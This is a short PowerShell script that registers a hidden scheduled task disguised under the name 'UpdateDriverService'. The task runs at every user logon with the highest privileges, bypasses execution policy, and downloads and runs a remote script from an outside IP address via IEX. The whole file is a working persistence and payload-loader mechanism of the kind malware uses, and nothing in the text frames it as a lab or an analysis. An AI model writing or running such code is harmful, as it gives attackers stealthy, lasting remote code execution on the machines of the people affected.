$taskName = "UpdateDriverService"
$payloadUrl = "http://192.168.6.111/payload.ps1"

$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command IEX(New-Object Net.WebClient).DownloadString('$payloadUrl')"
$trigger = New-ScheduledTaskTrigger -AtLogOn

Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -User "$env:USERNAME" -RunLevel Highest -Force
